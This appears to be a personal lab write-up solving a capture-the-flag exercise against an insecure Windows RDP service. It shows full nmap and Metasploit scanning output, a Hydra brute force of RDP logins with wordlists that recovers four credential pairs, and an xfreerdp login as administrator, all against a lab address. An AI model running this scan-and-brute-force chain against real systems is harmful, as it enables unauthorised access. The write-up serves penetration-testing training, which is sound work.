---
up: "[[Exploiting Windows Vulnerabilities]]"
---

# 🧪 Windows Insecure RDP Service

## Overview

A Kali GUI machine and a target machine running a vulnerable RDP service are provided to you. The IP address of the target machine is provided in a text file named target placed on the Desktop of the Kali machine (/root/Desktop/target). 

Your task is to fingerprint the running RDP service and its valid port using the tools available on the Kali machine and then exploit the vulnerability using the appropriate method.

**Note:** rdesktop will not work on this setup as it does not support NLA. Please use xfreerdp to connect to the RDP server.

**Objective:** Exploit the application and retrieve the flag!

Instructions:

- Your Kali machine has an interface with IP address 10.10.X.Y. Run “ip addr” to know the values of X and Y.
- The IP address of the target machine is mentioned in the file “/root/Desktop/target” 
- Do not attack the gateway located at IP address 192.V.W.1 and 10.10.X.1 
- Dictionaries to use: 
	- /usr/share/metasploit-framework/data/wordlists/common_users.txt
	- /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

## Solution

10.2.17.254

```bash
nmap -p- -T5 -Pn -sV $TRG
Starting Nmap 7.70 ( https://nmap.org ) at 2024-03-25 22:52 IST
Nmap scan report for 10.2.17.254
Host is up (0.0026s latency).
Not shown: 65523 closed ports
PORT      STATE SERVICE        VERSION
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds   Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3333/tcp  open  ssl/dec-notes?
5985/tcp  open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc          Microsoft Windows RPC
49153/tcp open  msrpc          Microsoft Windows RPC
49154/tcp open  msrpc          Microsoft Windows RPC
49155/tcp open  msrpc          Microsoft Windows RPC
49165/tcp open  msrpc          Microsoft Windows RPC
49177/tcp open  msrpc          Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 125.49 seconds
```

```bash
msf5 > search rdp_scanner

Matching Modules
================

   #  Name                               Disclosure Date  Rank    Check  Description
   -  ----                               ---------------  ----    -----  -----------
   0  auxiliary/scanner/rdp/rdp_scanner                   normal  No     Identify endpoints speaking the Remote Desktop Protocol (RDP)


msf5 > use 0
msf5 auxiliary(scanner/rdp/rdp_scanner) > setg RHOSTS 10.2.17.254
RHOSTS => 10.2.17.254
msf5 auxiliary(scanner/rdp/rdp_scanner) > set RPORT 3333
RPORT => 3333
msf5 auxiliary(scanner/rdp/rdp_scanner) > run

[*] 10.2.17.254:3333      - Detected RDP on 10.2.17.254:3333      (Windows version: 6.3.9600) (Requires NLA: Yes)
[*] 10.2.17.254:3333      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.2.17.254 -s 3333
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-03-25 23:02:55
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 7063 login tries (l:7/p:1009), ~1766 tries per task
[DATA] attacking rdp://10.2.17.254:3333/
[3333][rdp] host: 10.2.17.254   login: sysadmin   password: samantha
[ERROR] freerdp: The connection failed to establish.
[3333][rdp] host: 10.2.17.254   login: demo   password: victoria
[ERROR] freerdp: The connection failed to establish.
[3333][rdp] host: 10.2.17.254   login: auditor   password: elizabeth
[ERROR] freerdp: The connection failed to establish.
[3333][rdp] host: 10.2.17.254   login: administrator   password: qwertyuiop
[ERROR] freerdp: The connection failed to establish.
[STATUS] 6724.00 tries/min, 6724 tries in 00:01h, 339 to do in 00:01h, 4 active
1 of 1 target successfully completed, 4 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-03-25 23:03:59
```

Let's try with the `administrator` account first:

```bash
xfreerdp /u:administrator /p:qwertyuiop /v:10.2.17.254:3333
[23:05:26:994] [177310:177311] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr
[23:05:26:014] [177310:177311] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[23:05:26:014] [177310:177311] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[23:05:26:014] [177310:177311] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[23:05:26:014] [177310:177311] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.2.17.254:3333) 
[23:05:26:014] [177310:177311] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[23:05:26:014] [177310:177311] [ERROR][com.freerdp.crypto] - Common Name (CN):
[23:05:26:014] [177310:177311] [ERROR][com.freerdp.crypto] - 	WIN-OMCNBKR66MN
[23:05:26:014] [177310:177311] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.2.17.254:3333 (RDP-Server):
	Common Name: WIN-OMCNBKR66MN
	Subject:     CN = WIN-OMCNBKR66MN
	Issuer:      CN = WIN-OMCNBKR66MN
	Thumbprint:  29:ff:42:14:3e:fa:d9:fa:f8:1d:05:9f:d3:30:97:a9:1f:d4:91:a3
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
[23:05:32:091] [177310:177311] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: Asia/Kolkata
[23:05:32:121] [177310:177311] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[23:05:32:121] [177310:177311] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_RGB16
[23:05:32:141] [177310:177311] [INFO][com.winpr.clipboard] - initialized POSIX local file subsystem
[23:05:32:617] [177310:177311] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_FAILED_OTHER [LOGON_MSG_SESSION_CONTINUE]
```

![[Pasted image 20240325183610.png]]

![[Pasted image 20240325183659.png]]
